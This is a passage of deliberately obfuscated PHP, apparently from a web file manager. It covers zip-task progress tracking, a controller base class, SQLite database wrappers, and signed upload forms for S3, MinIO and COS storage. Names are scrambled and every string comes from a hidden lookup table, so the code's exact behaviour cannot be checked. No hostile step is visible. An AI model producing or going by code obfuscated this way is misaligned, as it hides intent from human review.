$Á¥ãˆÛİ[$ëÇ×³ıâ[79]]; $this->update(); self::log($ëÇ×³ıâ[1899] . json_encode(array($¬¢©Ê¸î, $Á¥ãˆÛİ))); } public function nameParse($ı¾‡¢ÖÖ) { $ï•ç·Üó =& $_SERVER[±³—úê]; $íç¶ÜÓ =& $this->task; if ($íç¶ÜÓ[$ï•ç·Üó[1894]] == $ï•ç·Üó[1281]) { $íç¶ÜÓ[$ï•ç·Üó[1894]] = $ï•ç·Üó[399]; $íç¶ÜÓ[$ï•ç·Üó[1834]] = 0; $íç¶ÜÓ[$ï•ç·Üó[843]] = 0; } $È›Í‘í¬ = get_path_this($ı¾‡¢ÖÖ); if (strstr($È›Í‘í¬, $ï•ç·Üó[10])) { $íç¶ÜÓ[$ï•ç·Üó[1776]] += 1; $íç¶ÜÓ[$ï•ç·Üó[1142]] += 1; } $íç¶ÜÓ[$ï•ç·Üó[1827]] = $ı¾‡¢ÖÖ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ƒ…ÁÈ– =& $_SERVER[±³—úê]; parent::startAfter(); Hook::bind($ƒ…ÁÈ–[1900], array($this, $ƒ…ÁÈ–[1890])); Hook::bind($ƒ…ÁÈ–[1892], array($this, $ƒ…ÁÈ–[1893])); $Áú¶—³û =& $this->task; $Áú¶—³û[$ƒ…ÁÈ–[1894]] = $ƒ…ÁÈ–[1281]; if (!$Áú¶—³û[$ƒ…ÁÈ–[1661]]) { $Áú¶—³û[$ƒ…ÁÈ–[1661]] = LNG($ƒ…ÁÈ–[1901]); } } protected function endAfter() { $ßŠ›ÉàÉ =& $_SERVER[±³—úê]; parent::endAfter(); Hook::unbind($ßŠ›ÉàÉ[1900], array($this, $ßŠ›ÉàÉ[1890])); Hook::unbind($ßŠ›ÉàÉ[1892], array($this, $ßŠ›ÉàÉ[1893])); } public function updateAfter() { $€Ùè–ù« =& $_SERVER[±³—úê]; $¢ê€ãú‚ =& $this->task; if (!$¢ê€ãú‚[$€Ùè–ù«[1142]] || !$¢ê€ãú‚[$€Ùè–ù«[843]]) { return; } if ($¢ê€ãú‚[$€Ùè–ù«[1894]] == $€Ùè–ù«[1281]) { $’šÙéã¡ = $¢ê€ãú‚[$€Ùè–ù«[1830]]; if ($¢ê€ãú‚[$€Ùè–ù«[1831]] != $€Ùè–ù«[1281]) { $’šÙéã¡ = 0; } $¹¿‹µˆ = ($¢ê€ãú‚[$€Ùè–ù«[1834]] + $’šÙéã¡) / $¢ê€ãú‚[$€Ùè–ù«[843]]; $¢ê€ãú‚[$€Ùè–ù«[1777]] = $¹¿‹µˆ * 0.3; } else { if ($¢ê€ãú‚[$€Ùè–ù«[1894]] == $€Ùè–ù«[399]) { $¹¿‹µˆ = $¢ê€ãú‚[$€Ùè–ù«[1776]] / $¢ê€ãú‚[$€Ùè–ù«[1142]]; $¢ê€ãú‚[$€Ùè–ù«[1777]] = 0.3 + $¹¿‹µˆ * 0.5; } else { if ($¢ê€ãú‚[$€Ùè–ù«[1894]] == $€Ùè–ù«[110]) { $¹¿‹µˆ = 0; if ($¢ê€ãú‚[$€Ùè–ù«[1829]]) { $¹¿‹µˆ = $¢ê€ãú‚[$€Ùè–ù«[1830]] / $¢ê€ãú‚[$€Ùè–ù«[1829]]; } $¢ê€ãú‚[$€Ùè–ù«[1777]] = 0.3 + 0.5 + $¹¿‹µˆ * 0.2; } } } if ($¢ê€ãú‚[$€Ùè–ù«[1777]] > 0) { $¢Œ»”„ = timeFloat() - $¢ê€ãú‚[$€Ùè–ù«[1779]] - $¢ê€ãú‚[$€Ùè–ù«[1782]]; $¢ê€ãú‚[$€Ùè–ù«[1783]] = $¢Œ»”„ * (1 - $¢ê€ãú‚[$€Ùè–ù«[1777]]) / $¢ê€ãú‚[$€Ùè–ù«[1777]]; } } public function copyFileStart($í®ˆ¸À, $ä’êŠæ‘, $“ôî¯ó¶, $Ç­óŸ×, $ê©«ïÕÎ, $‡ÔˆôÏÃ) { $µàäñŞ› =& $_SERVER[±³—úê]; parent::copyFileStart($í®ˆ¸À, $ä’êŠæ‘, $“ôî¯ó¶, $Ç­óŸ×, $ê©«ïÕÎ, $‡ÔˆôÏÃ); $­¢é›ÂÂ =& $this->task; if ($­¢é›ÂÂ[$µàäñŞ›[1894]] == $µàäñŞ›[399]) { $­¢é›ÂÂ[$µàäñŞ›[1894]] = $µàäñŞ›[110]; } $this->update(); } public function copyFileEnd($½“ŠÁ‹ˆ, $ Œ²Åš«, $¶ñÔóë, $†åØÇà, $‘…ÏëÕÀ, $Æ¦°¿¡) { $Ëâ¼¢‡ =& $_SERVER[±³—úê]; $ç•¢‘ =& $this->task; $ç•¢‘[$Ëâ¼¢‡[1830]] = $ç•¢‘[$Ëâ¼¢‡[1829]]; $ç•¢‘[$Ëâ¼¢‡[1834]] += $ç•¢‘[$Ëâ¼¢‡[1829]]; $ç•¢‘[$Ëâ¼¢‡[1831]] = $Ëâ¼¢‡[12]; $this->update(); } public function zipEvent($ó¥şİÀ, $ŸÄ·•‡, $°ËÕ¥»¥, $âÇßâÚ’) { $ÙğºÅ¶ş =& $_SERVER[±³—úê]; $• Ç¢‡š =& $this->task; $• Ç¢‡š[$ÙğºÅ¶ş[1827]] = get_path_this($ŸÄ·•‡); $• Ç¢‡š[$ÙğºÅ¶ş[1829]] = $âÇßâÚ’; $• Ç¢‡š[$ÙğºÅ¶ş[1830]] = $°ËÕ¥»¥; $• Ç¢‡š[$ÙğºÅ¶ş[1144]] = $ó¥şİÀ == $ÙğºÅ¶ş[1902] ? $ÙğºÅ¶ş[1897] : $ÙğºÅ¶ş[1898]; $• Ç¢‡š[$ÙğºÅ¶ş[1831]] = $ÙğºÅ¶ş[12]; $• Ç¢‡š[$ÙğºÅ¶ş[843]] = $âÇßâÚ’; $• Ç¢‡š[$ÙğºÅ¶ş[1894]] = $ÙğºÅ¶ş[399]; $this->update(); } public function nameParse($—œ¨œ¥ö) { $æ¨Õ‘‘³ =& $_SERVER[±³—úê]; $‹Å¿û½ã =& $this->task; if ($‹Å¿û½ã[$æ¨Õ‘‘³[1776]] < $‹Å¿û½ã[$æ¨Õ‘‘³[1142]]) { $ô¹ú¼â÷ = get_path_this($—œ¨œ¥ö); if (strstr($ô¹ú¼â÷, $æ¨Õ‘‘³[10])) { $‹Å¿û½ã[$æ¨Õ‘‘³[1776]] += 1; } } if ($‹Å¿û½ã[$æ¨Õ‘‘³[1894]] == $æ¨Õ‘‘³[1281]) { $‹Å¿û½ã[$æ¨Õ‘‘³[1894]] = $æ¨Õ‘‘³[399]; } $‹Å¿û½ã[$æ¨Õ‘‘³[1827]] = $—œ¨œ¥ö; $this->update(); } } goto D÷ÔÀÈÔó“; cŒ‘²¤Ñ–Û: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $äëØÙĞ´ =& $_SERVER[±³—úê]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$äëØÙĞ´[6]] =& $config; $this->values[$äëØÙĞ´[7]] =& $in; $this->tpl = TEMPLATE . MOD . $äëØÙĞ´[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÚĞºØÇº) { if (1 === func_num_args()) { $this->{$ÚĞºØÇº} = new $ÚĞºØÇº(); } else { $ª·ø”º³ = new ReflectionClass($ÚĞºØÇº); $€ôÏÄ†ê = func_get_args(); array_shift($€ôÏÄ†ê); $this->{$ÚĞºØÇº} = $ª·ø”º³->newInstanceArgs($€ôÏÄ†ê); } return $this->{$ÚĞºØÇº}; } public function routeBind($ºƒ÷ıĞ±, $†ÉÚ‡¼°, $¬†ğ™®˜ = 3) { $¸ûí‰– =& $_SERVER[±³—úê]; $¾…¨²òô = $this->in[$¸ûí‰–[9]]; $ºƒ÷ıĞ± = str_replace($¸ûí‰–[10], $¸ûí‰–[11], trim(trim($ºƒ÷ıĞ±, $¸ûí‰–[8]), $¸ûí‰–[12])); if (!$ºƒ÷ıĞ± || count($¾…¨²òô) <= $¬†ğ™®˜) { return !1; } $ØÕ”æˆò = !0; $ğóĞÜğ  = explode($¸ûí‰–[8], $ºƒ÷ıĞ±); for ($‹òÅë²¾ = 0; $‹òÅë²¾ < count($ğóĞÜğ ); $‹òÅë²¾++) { if ($ğóĞÜğ [$‹òÅë²¾] != $¾…¨²òô[$¬†ğ™®˜ + $‹òÅë²¾]) { $ØÕ”æˆò = !1; break; } } if (!$ØÕ”æˆò) { return; } call_user_func_array(array($this, $†ÉÚ‡¼°), array()); } public function routeArgs($½ƒ˜¬‡Ğ = 3) { $ÃÒü†è = $this->in[$_SERVER[±³—úê][9]]; if (count($ÃÒü†è) <= $½ƒ˜¬‡Ğ) { return array(); } $¥¾å×õŠ = array(); for ($€’ Á«¹ = $½ƒ˜¬‡Ğ; $€’ Á«¹ < count($ÃÒü†è); $€’ Á«¹ += 2) { $¥¾å×õŠ[$ÃÒü†è[$€’ Á«¹]] = $ÃÒü†è[$€’ Á«¹ + 1]; $this->in[$ÃÒü†è[$€’ Á«¹]] = $ÃÒü†è[$€’ Á«¹ + 1]; } return $¥¾å×õŠ; } protected function assign($Ë¹½ªç–, $üÄÇ ‡”) { $this->values[$Ë¹½ªç–] = $üÄÇ ‡”; } protected function display($ù­ï«òá) { ob_end_clean(); extract($this->values); require $this->tpl . $ù­ï«òá; } } class DbSqliteBase extends Db { public function __construct($š„Îèƒ = '') { $ş• ç±“ =& $_SERVER[±³—úê]; if (!extension_loaded($ş• ç±“[13])) { think_exception(think_lang($ş• ç±“[14]) . $ş• ç±“[15]); } if (!empty($š„Îèƒ)) { if (!isset($š„Îèƒ[$ş• ç±“[16]])) { $š„Îèƒ[$ş• ç±“[16]] = 438; } $this->config = $š„Îèƒ; if (empty($this->config[$ş• ç±“[17]])) { $this->config[$ş• ç±“[17]] = array(); } } } public function connect($ı»ŠÏ = '', $áÆ¯áÆ = 0) { $Ññşèõö =& $_SERVER[±³—úê]; if (!isset($this->linkID[$áÆ¯áÆ])) { if (empty($ı»ŠÏ)) { $ı»ŠÏ = $this->config; } $¡†œ©Ç = !empty($ı»ŠÏ[$Ññşèõö[17]][$Ññşèõö[18]]) ? $ı»ŠÏ[$Ññşèõö[17]][$Ññşèõö[18]] : $this->pconnect; $«Ù¥ÈšÓ = $¡†œ©Ç ? $Ññşèõö[19] : $Ññşèõö[20]; $this->linkID[$áÆ¯áÆ] = $«Ù¥ÈšÓ($ı»ŠÏ[$Ññşèõö[21]], $ı»ŠÏ[$Ññşèõö[16]]); if (!$this->linkID[$áÆ¯áÆ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$áÆ¯áÆ], 30000); if (1 != think_config($Ññşèõö[22])) { unset($this->config); } } return $this->linkID[$áÆ¯áÆ]; } public function free() { $this->queryID = null; } public function query($ˆ€Æ ú) { $Ò®ç¢À’ =& $_SERVER[±³—úê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆ€Æ ú; if ($this->queryID) { $this->free(); } think_action_status($Ò®ç¢À’[23], 1); think_status($Ò®ç¢À’[24]); $this->queryID = sqlite_query($this->_linkID, $ˆ€Æ ú); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÀªÖÇÔŒ = $this->getAll(); return $ÀªÖÇÔŒ; } } public function execute($’¸¨¢å¦) { $ñÙ´¹ =& $_SERVER[±³—úê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’¸¨¢å¦; if ($this->queryID) { $this->free(); } think_action_status($ñÙ´¹[25], 1); think_status($ñÙ´¹[24]); $áñ­áä = sqlite_exec($this->_linkID, $’¸¨¢å¦); $this->debug(); if (!1 === $áñ­áä) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[±³—úê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ç˜ÉĞ’ó = sqlite_query($this->_linkID, $_SERVER[±³—úê][27]); if (!$Ç˜ÉĞ’ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $´‘¢ÍÖ½ = sqlite_query($this->_linkID, $_SERVER[±³—úê][28]); if (!$´‘¢ÍÖ½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $êÛœà‚ü = array(); if ($this->numRows > 0) { for ($„¼µ´ö™ = 0; $„¼µ´ö™ < $this->numRows; $„¼µ´ö™++) { $êÛœà‚ü[$„¼µ´ö™] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $êÛœà‚ü; } public function getFields($ÌÙ–á¬ê) { $Ìæåá˜¿ =& $_SERVER[±³—úê]; $ıÄßÓ¹ = $this->query($Ìæåá˜¿[29] . $ÌÙ–á¬ê . $Ìæåá˜¿[30]); $ÜáÖÅºÙ = array(); if ($ıÄßÓ¹) { foreach ($ıÄßÓ¹ as $õ¼Ëè¨ => $ÉŞÖÓ) { $ÜáÖÅºÙ[$ÉŞÖÓ[$Ìæåá˜¿[31]]] = array($Ìæåá˜¿[32] => $ÉŞÖÓ[$Ìæåá˜¿[31]], $Ìæåá˜¿[33] => $ÉŞÖÓ[$Ìæåá˜¿[34]], $Ìæåá˜¿[35] => (bool) ($ÉŞÖÓ[$Ìæåá˜¿[36]] === $Ìæåá˜¿[12]), $Ìæåá˜¿[37] => $ÉŞÖÓ[$Ìæåá˜¿[38]], $Ìæåá˜¿[39] => strtolower($ÉŞÖÓ[$Ìæåá˜¿[40]]) == $Ìæåá˜¿[41], $Ìæåá˜¿[42] => strtolower($ÉŞÖÓ[$Ìæåá˜¿[43]]) == $Ìæåá˜¿[44]); } } return $ÜáÖÅºÙ; } public function getTables($Œ°‚ˆ†ì = '') { $ì¨Îº«ü =& $_SERVER[±³—úê]; $Æè®™ÏÙ = $this->query($ì¨Îº«ü[45] . $ì¨Îº«ü[46] . $ì¨Îº«ü[47]); $ÍçÄÔİï = array(); foreach ($Æè®™ÏÙ as $÷ßé¦œ => $ïƒÑ…®¡) { $ÍçÄÔİï[$÷ßé¦œ] = current($ïƒÑ…®¡); } return $ÍçÄÔİï; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $™ÖÚĞ…Â =& $_SERVER[±³—úê]; $¾Éã¹¼á = sqlite_last_error($this->_linkID); $this->error = $¾Éã¹¼á . $™ÖÚĞ…Â[4] . sqlite_error_string($¾Éã¹¼á); if ($™ÖÚĞ…Â[12] != $this->queryStr) { $this->error .= LNG($™ÖÚĞ…Â[48]) . $this->queryStr; } think_trace($this->error, $™ÖÚĞ…Â[12], $™ÖÚĞ…Â[49]); return $this->error; } public function escapeString($Å²´ÓçÎ) { return sqlite_escape_string($Å²´ÓçÎ); } public function parseLimit($³±¢Æ²) { $¾¢–î÷ =& $_SERVER[±³—úê]; $àğ©ğßÒ = $¾¢–î÷[12]; if (!empty($³±¢Æ²)) { $³±¢Æ² = explode($¾¢–î÷[50], $³±¢Æ²); if (count($³±¢Æ²) > 1) { $àğ©ğßÒ .= $¾¢–î÷[51] . $³±¢Æ²[1] . $¾¢–î÷[52] . $³±¢Æ²[0] . $¾¢–î÷[53]; } else { $àğ©ğßÒ .= $¾¢–î÷[51] . $³±¢Æ²[0] . $¾¢–î÷[53]; } } return $àğ©ğßÒ; } } class DbSqlite3Base extends Db { public function __construct($Ç¤Ò¾ = '') { $¿ÊÉÙ =& $_SERVER[±³—úê]; if (!class_exists($¿ÊÉÙ[54])) { think_exception(think_lang($¿ÊÉÙ[14]) . $¿ÊÉÙ[55]); } if (!empty($Ç¤Ò¾)) { if (!isset($Ç¤Ò¾[$¿ÊÉÙ[16]])) { $Ç¤Ò¾[$¿ÊÉÙ[16]] = 438; } $this->config = $Ç¤Ò¾; if (empty($this->config[$¿ÊÉÙ[17]])) { $this->config[$¿ÊÉÙ[17]] = array(); } } } public function connect($ëì¨úŠ = '', $ÌÔÚÑ« = 0) { $ïí°­± =& $_SERVER[±³—úê]; if (!isset($this->linkID[$ÌÔÚÑ«])) { if (empty($ëì¨úŠ)) { $ëì¨úŠ = $this->config; } $this->linkID[$ÌÔÚÑ«] = new SQLite3($ëì¨úŠ[$ïí°­±[21]]); if (!$this->linkID[$ÌÔÚÑ«]) { think_exception($this->linkID[$ÌÔÚÑ«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÌÔÚÑ«]->busyTimeout(30000); if (1 != think_config($ïí°­±[22])) { unset($this->config); } } return $this->linkID[$ÌÔÚÑ«]; } public function free() { $this->queryID = null; } public function query($¿òÖøà¼) { $Ü¥ªì®Á =& $_SERVER[±³—úê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¿òÖøà¼; if ($this->queryID) { $this->free(); } think_action_status($Ü¥ªì®Á[23], 1); think_status($Ü¥ªì®Á[24]); $this->queryID = $this->_linkID->query($¿òÖøà¼); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ƒÁ°àŒŸ = $this->getAll(); $this->numRows = count($ƒÁ°àŒŸ); return $ƒÁ°àŒŸ; } } public function execute($¸Ÿ±øğ¤) { $©“¤¶Š =& $_SERVER[±³—úê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¸Ÿ±øğ¤; if ($this->queryID) { $this->free(); } think_action_status($©“¤¶Š[25], 1); think_status($©“¤¶Š[24]); $İ‘şÚò = $this->_linkID->exec($¸Ÿ±øğ¤); $this->debug(); if (!1 === $İ‘şÚò) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[±³—úê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ß½ò²ê = $this->_linkID->query($_SERVER[±³—úê][27]); if (!$ß½ò²ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ôÁ¼Ëò = $this->_linkID->query($_SERVER[±³—úê][28]); if (!$ôÁ¼Ëò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Íß¡Ù® = array(); while ($æ®‘„ä” = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Íß¡Ù®[] = $æ®‘„ä”; } $this->queryID->reset(); return $Íß¡Ù®; } public function getFields($–…‚¾ÒÔ) { $éÈËßè· =& $_SERVER[±³—úê]; $ª‰ş‚†õ = $this->query($éÈËßè·[29] . $–…‚¾ÒÔ . $éÈËßè·[30]); $ÂŸ‰Ó£™ = array(); if ($ª‰ş‚†õ) { foreach ($ª‰ş‚†õ as $µ“œÈ·É => $’í»ï‚Ç) { $ÂŸ‰Ó£™[$’í»ï‚Ç[$éÈËßè·[32]]] = array($éÈËßè·[32] => $’í»ï‚Ç[$éÈËßè·[32]], $éÈËßè·[33] => $’í»ï‚Ç[$éÈËßè·[33]], $éÈËßè·[35] => (bool) ($’í»ï‚Ç[$éÈËßè·[35]] === $éÈËßè·[12]), $éÈËßè·[37] => $’í»ï‚Ç[$éÈËßè·[56]], $éÈËßè·[39] => (bool) $’í»ï‚Ç[$éÈËßè·[57]], $éÈËßè·[42] => (bool) $’í»ï‚Ç[$éÈËßè·[57]]); } } return $ÂŸ‰Ó£™; } public function getTables($¬ÀÌ° = '') { $«áüôâ =& $_SERVER[±³—úê]; $¢Ó·ò›¤ = $this->query($«áüôâ[45] . $«áüôâ[46] . $«áüôâ[47]); $¬µĞ‹ú› = array(); foreach ($¢Ó·ò›¤ as $³ô³Í¦¥ => $º…§éÁÒ) { $¬µĞ‹ú›[$³ô³Í¦¥] = current($º…§éÁÒ); } return $¬µĞ‹ú›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $èì§™óâ =& $_SERVER[±³—úê]; $this->error = $this->_linkID->lastErrorMsg(); if ($èì§™óâ[12] != $this->queryStr) { $this->error .= LNG($èì§™óâ[48]) . $this->queryStr; } think_trace($this->error, $èì§™óâ[12], $èì§™óâ[49]); return $this->error; } public function escapeString($Îî§™î›) { $Æ¨¸³¥ó =& $_SERVER[±³—úê]; if ($this->_linkID) { return $this->_linkID->escapeString($Îî§™î›); } return str_ireplace($Æ¨¸³¥ó[58], $Æ¨¸³¥ó[59], $Îî§™î›); } public function parseLimit($ÂÕÆ¦èÚ) { $ŸË×Óü§ =& $_SERVER[±³—úê]; $üÚ­•È¬ = $ŸË×Óü§[12]; if (!empty($ÂÕÆ¦èÚ)) { $ÂÕÆ¦èÚ = explode($ŸË×Óü§[50], $ÂÕÆ¦èÚ); if (count($ÂÕÆ¦èÚ) > 1) { $üÚ­•È¬ .= $ŸË×Óü§[51] . $ÂÕÆ¦èÚ[1] . $ŸË×Óü§[52] . $ÂÕÆ¦èÚ[0] . $ŸË×Óü§[53]; } else { $üÚ­•È¬ .= $ŸË×Óü§[51] . $ÂÕÆ¦èÚ[0] . $ŸË×Óü§[53]; } } return $üÚ­•È¬; } } goto FÙôòñ ùµ; Bà†˜®Õ„Ñ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÍÒ¡Ë·ñ) { $Ó™’ı€’ =& $_SERVER[±³—úê]; parent::__construct($ÍÒ¡Ë·ñ); $this->setSignVersion($Ó™’ı€’[259]); if (!$this->region) { $this->region = $Ó™’ı€’[316]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ï¥¤©°ß = $this->getBktRegion(); return $this->region == $ï¥¤©°ß ? !0 : !1; } public function uploadFormData($ú¾åìÀŸ, $İ²ÂÏ¤ï = 3600) { $‹øÓŸ¿” =& $_SERVER[±³—úê]; $×ı»ü«Ø = $‹øÓŸ¿”[241]; $”ı±Ã¤¤ = $‹øÓŸ¿”[269]; $¿æ‰ÁÏü = $‹øÓŸ¿”[62]; $¯ûÛşÔ‡ = gmdate($‹øÓŸ¿”[270]); $ğøØÉ§— = gmdate($‹øÓŸ¿”[271]); $ß¾«§Ø¯ = $‹øÓŸ¿”[272]; $úç”ö·ş = $İ²ÂÏ¤ï . $‹øÓŸ¿”[12]; $öˆóßà = $‹øÓŸ¿”[273]; $®ÇÃÌ™Í = array($this->accessKey, $ğøØÉ§—, $this->region, $¿æ‰ÁÏü, $ß¾«§Ø¯); $ş™†àÊ‡ = implode($‹øÓŸ¿”[8], $®ÇÃÌ™Í); $Ú†¤íË‘ = array($‹øÓŸ¿”[274] => gmdate($‹øÓŸ¿”[275], strtotime($‹øÓŸ¿”[276])), $‹øÓŸ¿”[277] => array(array($‹øÓŸ¿”[278] => $this->bucket), array($‹øÓŸ¿”[317] => $×ı»ü«Ø), array($‹øÓŸ¿”[279], $‹øÓŸ¿”[280], $‹øÓŸ¿”[12]), array($‹øÓŸ¿”[279], $‹øÓŸ¿”[281], $‹øÓŸ¿”[12]), array($‹øÓŸ¿”[279], $‹øÓŸ¿”[318], $‹øÓŸ¿”[12]), array($‹øÓŸ¿”[282] => $öˆóßà), array($‹øÓŸ¿”[283] => $ş™†àÊ‡), array($‹øÓŸ¿”[284] => $”ı±Ã¤¤), array($‹øÓŸ¿”[285] => $¯ûÛşÔ‡), array($‹øÓŸ¿”[286] => $úç”ö·ş))); $Óåçş³Ÿ = base64_encode(json_encode($Ú†¤íË‘)); $ô„ªœ³· = hash_hmac($‹øÓŸ¿”[287], $ğøØÉ§—, $‹øÓŸ¿”[288] . $this->secret, !0); $íëûö·¬ = hash_hmac($‹øÓŸ¿”[287], $this->region, $ô„ªœ³·, !0); $××±Î¾ğ = hash_hmac($‹øÓŸ¿”[287], $¿æ‰ÁÏü, $íëûö·¬, !0); $Îû¥ü = hash_hmac($‹øÓŸ¿”[287], $ß¾«§Ø¯, $××±Î¾ğ, !0); $éÑÂÙáß = hash_hmac($‹øÓŸ¿”[287], $Óåçş³Ÿ, $Îû¥ü); $€»ãâ²‰ = array($‹øÓŸ¿”[258] => $‹øÓŸ¿”[12], $‹øÓŸ¿”[305] => $‹øÓŸ¿”[12], $‹øÓŸ¿”[317] => $×ı»ü«Ø, $‹øÓŸ¿”[282] => $öˆóßà, $‹øÓŸ¿”[289] => $Óåçş³Ÿ, $‹øÓŸ¿”[319] => $ş™†àÊ‡, $‹øÓŸ¿”[320] => $”ı±Ã¤¤, $‹øÓŸ¿”[321] => $¯ûÛşÔ‡, $‹øÓŸ¿”[322] => $úç”ö·ş, $‹øÓŸ¿”[323] => $éÑÂÙáß, $‹øÓŸ¿”[208] => $this->getHost()); return $€»ãâ²‰; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($—Õ÷³«¶) { $“Ÿæå¾™ =& $_SERVER[±³—úê]; parent::__construct($—Õ÷³«¶); $Ä÷¨×Í = isset($—Õ÷³«¶[$“Ÿæå¾™[268]]) && $—Õ÷³«¶[$“Ÿæå¾™[268]] == $“Ÿæå¾™[259] ? $“Ÿæå¾™[259] : $“Ÿæå¾™[324]; $this->setSignVersion($Ä÷¨×Í); } public function link($‚òìÂó€, $¦´íÏ€ê = array()) { return parent::link($‚òìÂó€, $¦´íÏ€ê); } public function fileOut($”î±È”, $ÔøÁ×åá = false, $­¸ç½÷˜ = false, $¿‘í€± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[±³—úê][325])) { return parent::fileOutServer($”î±È”, $ÔøÁ×åá, $­¸ç½÷˜, $¿‘í€±); } parent::fileOut($”î±È”, $ÔøÁ×åá, $­¸ç½÷˜, $¿‘í€±); } public function fileOutImage($¦•°˜Ï, $£Ã¬ÌÛæ = 250) { if (strstr($this->endpoint, $_SERVER[±³—úê][325])) { return parent::fileOutImageServer($¦•°˜Ï, $£Ã¬ÌÛæ); } parent::fileOutImage($¦•°˜Ï, $£Ã¬ÌÛæ); } public function fileOutLink($¸Å²É£) { $½Ü¡Óö¦ =& $_SERVER[±³—úê]; if (substr($¸Å²É£, 0, 7) == $½Ü¡Óö¦[228]) { $¸Å²É£ = $½Ü¡Óö¦[229] . substr($¸Å²É£, 7); } header($½Ü¡Óö¦[175] . $¸Å²É£); die; } } define($_SERVER[±³—úê][326], 1); goto cä„×“‹Ÿë; e²ÈçòÓ¦à: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($»´è»ÖÅ) { parent::__construct($»´è»ÖÅ); $this->setSignVersion($_SERVER[±³—úê][259]); } public function uploadFormData($Ê–³Ûê, $¸å›òĞ = 3600) { $Ëã¯ûÇ =& $_SERVER[±³—úê]; $ûÎÌÀÜƒ = $Ëã¯ûÇ[241]; $İÙú½‰ = $Ëã¯ûÇ[1414]; $¢¨û½Ÿ = $Ëã¯ûÇ[273]; $±ºÚëÊ = gmdate($Ëã¯ûÇ[1415], time() + $¸å›òĞ); $˜ã¢¾Àì = (string) time() . $Ëã¯ûÇ[74] . (string) (time() + $¸å›òĞ); $ßÏ†Áœö = array($Ëã¯ûÇ[274] => $±ºÚëÊ, $Ëã¯ûÇ[277] => array(array($Ëã¯ûÇ[317] => $ûÎÌÀÜƒ), array($Ëã¯ûÇ[278] => $this->bucket), array($Ëã¯ûÇ[279], $Ëã¯ûÇ[280], $Ëã¯ûÇ[12]), array($Ëã¯ûÇ[282] => $¢¨û½Ÿ), array($Ëã¯ûÇ[1416] => $İÙú½‰), array($Ëã¯ûÇ[1417] => $this->accessKey), array($Ëã¯ûÇ[1418] => $˜ã¢¾Àì))); $ßÏ†Áœö = json_encode($ßÏ†Áœö); $ƒå•è«Ö = hash_hmac($Ëã¯ûÇ[1414], $˜ã¢¾Àì, $this->secret); $£ƒëäÙ¯ = sha1($ßÏ†Áœö); $—ÈîîÌÒ = hash_hmac($Ëã¯ûÇ[1414], $£ƒëäÙ¯, $ƒå•è«Ö); $ˆ´…‡ƒ = array($Ëã¯ûÇ[317] => $ûÎÌÀÜƒ, $Ëã¯ûÇ[282] => $¢¨û½Ÿ, $Ëã¯ûÇ[289] => base64_encode($ßÏ†Áœö), $Ëã¯ûÇ[1416] => $İÙú½‰, $Ëã¯ûÇ[1417] => $this->accessKey, $Ëã¯ûÇ[1419] => $˜ã¢¾Àì, $Ëã¯ûÇ[1420] => $—ÈîîÌÒ, $Ëã¯ûÇ[208] => $this->getHost()); return $ˆ´…‡ƒ; } public function fileOutImage($Ö¯ò‘æ, $ª—õóÜò = 250) { $‰îÀè¾ =& $_SERVER[±³—úê]; if ($this->size($Ö¯ò‘æ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Ö¯ò‘æ, $ª—õóÜò); } $¢Ù¨÷ÈÄ = $this->link($Ö¯ò‘æ); $¢Ù¨÷ÈÄ .= $‰îÀè¾[1421] . $ª—õóÜò . $‰îÀè¾[1422]; $this->fileOutLink($¢Ù¨÷ÈÄ); } public function fileOutLink($îÑ’Ğß‰) { $¥Ü­ıƒ  =& $_SERVER[±³—úê]; if (substr($îÑ’Ğß‰, 0, 7) == $¥Ü­ıƒ [228]) { $îÑ’Ğß‰ = $¥Ü­ıƒ [229] . substr($îÑ’Ğß‰, 7); } header($¥Ü­ıƒ [175] . $îÑ’Ğß‰); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢ï‰üÒµ) { $this->pathParse = $¢ï‰üÒµ; $this->model = Model($_SERVER[±³—úê][1423]); } public function 